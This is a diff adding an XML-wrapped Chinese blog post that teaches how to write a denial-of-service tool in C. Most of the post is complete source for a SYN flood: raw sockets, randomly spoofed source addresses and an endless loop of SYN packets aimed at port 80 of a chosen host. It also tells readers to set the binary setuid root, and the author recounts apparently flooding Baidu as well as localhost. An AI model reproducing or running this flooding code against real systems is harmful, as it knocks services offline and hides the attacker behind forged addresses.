@@ -1,0 +1,167 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<title>教你用c语言实现dos攻击</title>
+<content>&amp;lt;p&amp;nbsp;style=\"text-indent:2em;\"&amp;gt;
+	还记得DOS是什么意思吗？参考了一个大牛的程序，写了个实现DOS的小程序。&amp;nbsp;下面是程序的源代码。别做坏事哦，不过现在一般服务器都添加规则防dos攻击了的。
+&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;nbsp;style=\"text-indent:2em;\"&amp;gt;
+	程序我尽量注释的详细点，免得以后再看的时候，自己都看不懂了。有人说脚本就是当时写的时候懂，过一会就很难看懂了，我觉得程序也是这么会事。当然如果你的脚本不到100行，程序不到1k除外。正则到10行，我就头晕了^_^
+&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;nbsp;style=\"text-indent:2em;\"&amp;gt;
+&amp;lt;pre&amp;nbsp;name=\"code\"&amp;nbsp;id=\"prettyprint\"&amp;nbsp;class=\"cpp\"&amp;gt;&amp;nbsp;/********************&amp;nbsp;DOS.c&amp;nbsp;*****************/
+#include&amp;nbsp;&amp;amp;lt;sys/socket.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;netinet/in.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;netinet/ip.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;netinet/tcp.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;stdlib.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;errno.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;unistd.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;stdio.h&amp;amp;gt;
+#include&amp;nbsp;&amp;amp;lt;netdb.h&amp;amp;gt;
+#define&amp;nbsp;DESTPORT&amp;nbsp;80&amp;nbsp;/*&amp;nbsp;要攻击的端口(WEB)&amp;nbsp;*/
+#define&amp;nbsp;LOCALPORT&amp;nbsp;8888
+void&amp;nbsp;send_tcp(int&amp;nbsp;sockfd,struct&amp;nbsp;sockaddr_in&amp;nbsp;*addr);
+unsigned&amp;nbsp;short&amp;nbsp;check_sum(unsigned&amp;nbsp;short&amp;nbsp;*addr,int&amp;nbsp;len);
+int&amp;nbsp;main(int&amp;nbsp;argc,char&amp;nbsp;**argv)
+{
+int&amp;nbsp;sockfd;
+struct&amp;nbsp;sockaddr_in&amp;nbsp;addr;
+struct&amp;nbsp;hostent&amp;nbsp;*host;
+int&amp;nbsp;on=1;
+if(argc!=2)
+{
+fprintf(stderr,\"Usage:%s&amp;nbsp;hostnamena\",argv[0]);
+exit(1);
+}
+bzero(&amp;amp;addr,sizeof(struct&amp;nbsp;sockaddr_in));
+addr.sin_family=AF_INET;
+addr.sin_port=htons(DESTPORT);
+/*看成是获取你要ping的目标的网络地址,argv[1]是ip的话直接a&amp;nbsp;to&amp;nbsp;n,是域名的话就要gethostbyname了*/
+if(inet_aton(argv[1],&amp;amp;addr.sin_addr)==0)
+{
+host=gethostbyname(argv[1]);
+if(host==NULL)
+{
+fprintf(stderr,\"HostName&amp;nbsp;Error:%sna\",hstrerror(h_errno));
+exit(1);
+}
+addr.sin_addr=*(struct&amp;nbsp;in_addr&amp;nbsp;*)(host-&amp;amp;gt;h_addr_list[0]);
+}
+/****&amp;nbsp;使用IPPROTO_TCP创建一个TCP的原始套接字&amp;nbsp;****/
+sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
+if(sockfd&amp;amp;lt;0)
+{
+fprintf(stderr,\"Socket&amp;nbsp;Error:%sna\",strerror(errno));
+exit(1);
+}
+/********&amp;nbsp;设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写&amp;nbsp;***/
+setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;amp;on,sizeof(on));
+/****&amp;nbsp;没有办法,只用超级护用户才可以使用原始套接字&amp;nbsp;*********/
+setuid(getpid());
+/*********&amp;nbsp;发送炸弹了!!!!&amp;nbsp;****/
+send_tcp(sockfd,&amp;amp;addr);
+}
+/*******&amp;nbsp;发送炸弹的实现&amp;nbsp;*********/
+void&amp;nbsp;send_tcp(int&amp;nbsp;sockfd,struct&amp;nbsp;sockaddr_in&amp;nbsp;*addr)
+{
+char&amp;nbsp;buffer[100];&amp;nbsp;/****&amp;nbsp;用来放置我们的数据包&amp;nbsp;****/
+struct&amp;nbsp;ip&amp;nbsp;*ip;
+struct&amp;nbsp;tcphdr&amp;nbsp;*tcp;
+int&amp;nbsp;head_len;
+/*******&amp;nbsp;我们的数据包实际上没有任何内容,所以长度就是两个结构的长度&amp;nbsp;***/
+head_len=sizeof(struct&amp;nbsp;ip)+sizeof(struct&amp;nbsp;tcphdr);
+bzero(buffer,100);
+/********&amp;nbsp;填充IP数据包的头部,还记得IP的头格式吗?&amp;nbsp;******/
+ip=(struct&amp;nbsp;ip&amp;nbsp;*)buffer;
+ip-&amp;amp;gt;ip_v=IPVERSION;&amp;nbsp;/**&amp;nbsp;版本一般的是&amp;nbsp;4&amp;nbsp;**/
+ip-&amp;amp;gt;ip_hl=sizeof(struct&amp;nbsp;ip)&amp;amp;gt;&amp;amp;gt;2;&amp;nbsp;/**&amp;nbsp;IP数据包的头部长度&amp;nbsp;**/
+ip-&amp;amp;gt;ip_tos=0;&amp;nbsp;/**&amp;nbsp;服务类型&amp;nbsp;**/
+ip-&amp;amp;gt;ip_len=htons(head_len);&amp;nbsp;/**&amp;nbsp;IP数据包的长度&amp;nbsp;**/
+ip-&amp;amp;gt;ip_id=0;&amp;nbsp;/**&amp;nbsp;让系统去填写吧&amp;nbsp;**/
+ip-&amp;amp;gt;ip_off=0;&amp;nbsp;/**&amp;nbsp;和上面一样,省点时间&amp;nbsp;**/
+ip-&amp;amp;gt;ip_ttl=MAXTTL;&amp;nbsp;/**&amp;nbsp;最长的时间&amp;nbsp;255&amp;nbsp;**/
+ip-&amp;amp;gt;ip_p=IPPROTO_TCP;&amp;nbsp;/**&amp;nbsp;我们要发的是&amp;nbsp;TCP包&amp;nbsp;**/
+ip-&amp;amp;gt;ip_sum=0;&amp;nbsp;/**&amp;nbsp;校验和让系统去做&amp;nbsp;**/
+ip-&amp;amp;gt;ip_dst=addr-&amp;amp;gt;sin_addr;&amp;nbsp;/**&amp;nbsp;我们攻击的对象&amp;nbsp;**/
+/*******&amp;nbsp;开始填写TCP数据包&amp;nbsp;*****/
+tcp=(struct&amp;nbsp;tcphdr&amp;nbsp;*)(buffer&amp;nbsp;+sizeof(struct&amp;nbsp;ip));
+tcp-&amp;amp;gt;source=htons(LOCALPORT);
+tcp-&amp;amp;gt;dest=addr-&amp;amp;gt;sin_port;&amp;nbsp;/**&amp;nbsp;目的端口&amp;nbsp;**/
+tcp-&amp;amp;gt;seq=random();
+tcp-&amp;amp;gt;ack_seq=0;
+tcp-&amp;amp;gt;doff=5;
+tcp-&amp;amp;gt;syn=1;&amp;nbsp;/**&amp;nbsp;我要建立连接&amp;nbsp;**/
+tcp-&amp;amp;gt;check=0;
+/**&amp;nbsp;好了,一切都准备好了.服务器,你准备好了没有??&amp;nbsp;^_^&amp;nbsp;**/
+while(1)
+{
+/**&amp;nbsp;你不知道我是从那里来的,慢慢的去等吧!&amp;nbsp;**/
+ip-&amp;amp;gt;ip_src.s_addr=random();
+/**&amp;nbsp;什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧&amp;nbsp;*/
+/**&amp;nbsp;下面这条可有可无&amp;nbsp;*/
+tcp-&amp;amp;gt;check=check_sum((unsigned&amp;nbsp;short&amp;nbsp;*)tcp,
+sizeof(struct&amp;nbsp;tcphdr));
+sendto(sockfd,buffer,head_len,0,addr,sizeof(struct&amp;nbsp;sockaddr_in));
+}
+}
+/*&amp;nbsp;下面是首部校验和的算法,偷了别人的&amp;nbsp;*/
+unsigned&amp;nbsp;short&amp;nbsp;check_sum(unsigned&amp;nbsp;short&amp;nbsp;*addr,int&amp;nbsp;len)
+{
+register&amp;nbsp;int&amp;nbsp;nleft=len;
+register&amp;nbsp;int&amp;nbsp;sum=0;
+register&amp;nbsp;short&amp;nbsp;*w=addr;
+short&amp;nbsp;answer=0;
+while(nleft&amp;amp;gt;1)
+{
+sum+=*w++;
+nleft-=2;
+}
+if(nleft==1)
+{
+*(unsigned&amp;nbsp;char&amp;nbsp;*)(&amp;amp;answer)=*(unsigned&amp;nbsp;char&amp;nbsp;*)w;
+sum+=answer;
+}
+sum=(sum&amp;amp;gt;&amp;amp;gt;16)+(sum&amp;amp;0xffff);
+sum+=(sum&amp;amp;gt;&amp;amp;gt;16);
+answer=~sum;
+return(answer);
+}&amp;lt;/pre&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;编译一下，拿localhost做一下实验，看看有什么结果。（千万不要试别人的啊）。&amp;nbsp;为了让普通用户可以运行这个程序，我们应该将这个程序的所有者变为root，且&amp;nbsp;设置setuid位
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;sudo&amp;nbsp;./dos就可以了
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;我在心里只数了5只绵羊，wireshark也第一次假死，我不知道这样用对不对，还是跳不出windows的思维方式，惭愧。发了10多万个包……
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;还发现个奇怪的问题我先ping&amp;nbsp;百度的时候ip是202.108.22.5
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;我dos一会后，百度ip变为202.108.22.43.
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;难道。5挂了^_^怕怕，截图就低调点放dos自己电脑的图了。自己的快速数到5，居然差不多发了3.9万个包
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;总结
+	&amp;lt;/p&amp;gt;
+	&amp;lt;p&amp;gt;
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;原始套接字和一般的套接字不同的是以前许多由系统做的事情，现在要由我们自己来做了。&amp;nbsp;不过这里面是不是有很多的乐趣呢。&amp;nbsp;当我们创建了一个&amp;nbsp;TCP套接字的时候，我们只是负责把我们要发送的内容（buffer）传递给了系统。&amp;nbsp;系统在收到我们的数据后，回自动的调用相应的模块给数据加上TCP&amp;nbsp;头部，然后加上IP头部。&amp;nbsp;再发送出去。而现在是我们自己创建各个的头部，系统只是把它们发送出去。&amp;nbsp;在上面的实例中，由于我们要修改我们的源IP地址，&amp;nbsp;所以我们使用了setsockopt函数，如果我们只是修改TCP数据，那么IP数据一样也可以由系统来创建的。
+	&amp;lt;/p&amp;gt;
+&amp;lt;/p&amp;gt;</content>
+<json-link>./file/c/2012-06-14/1339661043.json</json-link>
+<comment-link>4</comment-link>
+<tags>5</tags>
+<imghref/>
+<comment-list>
+ <c>
+  <author-c>1</author-c>
+  <uid-c>2</uid-c>
+  <date-c>2</date-c>
+  <conf-c>3</conf-c>
+  <locked>true</locked>
+ </c>
+</comment-list>
+</root>
